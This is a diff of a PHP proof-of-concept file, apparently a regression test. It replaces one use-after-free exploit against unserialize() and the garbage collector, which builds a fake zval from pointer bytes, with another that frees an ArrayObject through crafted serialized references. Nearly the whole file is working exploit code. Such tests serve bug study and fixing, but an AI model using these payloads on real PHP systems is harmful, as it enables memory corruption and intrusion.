@@ -1,28 +1,17 @@
 <?php
-
-$arr = [1, [1, 2, 3, 4, 5], 3, 4, 5];
-$poc = 'a:3:{i:1;N;i:2;O:4:"snmp":1:{s:11:"quick_print";'.serialize($arr).'}i:1;R:7;}';
-$out = unserialize($poc);
+// Fill any potential freed spaces until now.
+$filler = array();
+for($i = 0; $i < 100; $i++)
+	$filler[] = "";
+// Create our payload and unserialize it.
+$serialized_payload = 'a:3:{i:0;r:1;i:1;r:1;i:2;C:11:"ArrayObject":19:{x:i:0;r:1;;m:a:0:{}}}';
+$free_me = unserialize($serialized_payload);
+// We need to increment the reference counter of our ArrayObject s.t. all reference counters of our unserialized array become 0.
+$inc_ref_by_one = $free_me[2];
+// The call to gc_collect_cycles will free '$free_me'.
 gc_collect_cycles();
-$fakezval = ptr2str(1122334455);
-$fakezval .= ptr2str(0);
-$fakezval .= "\x00\x00\x00\x00";
-$fakezval .= "\x01";
-$fakezval .= "\x00";
-$fakezval .= "\x00\x00";
-for ($i = 0; $i < 5; $i++) {
-    $v[$i] = $fakezval.$i;
-}
-var_dump($out[1]);
-
-function ptr2str($ptr)
-{
-    $out = '';
-    for ($i = 0; $i < 8; $i++) {
-        $out .= chr($ptr & 0xff);
-        $ptr >>= 8;
-    }
-    return $out;
-}
-
+// We now have multiple freed spaces. Fill all of them.
+$fill_freed_space_1 = "filler_zval_1";
+$fill_freed_space_2 = "filler_zval_2";
+var_dump($free_me);
 ?>
